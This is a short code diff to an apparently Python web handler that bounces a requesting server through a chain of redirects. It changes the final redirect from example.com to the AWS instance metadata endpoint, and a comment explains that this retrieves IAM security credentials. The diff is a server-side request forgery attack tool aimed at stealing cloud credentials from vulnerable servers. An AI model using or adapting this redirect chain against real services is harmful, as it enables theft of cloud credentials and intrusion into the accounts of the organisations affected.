@@ -32,7 +32,7 @@ def redir():
     # If we've reached 10 redirects, redirect to our desired location
     # To grab AWS metadata keys, you would hit http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name-here
     if redirect_count >= max_redirects:
-        return redirect("http://example.com", code=302)
+        return redirect("http://169.254.169.254/latest/meta-data/", code=302)
     print("trying: " + str(status_code))
     # Otherwise, redirect back to /redir with incremented counter
     return redirect(f"/redir?count={redirect_count}", code=status_code)
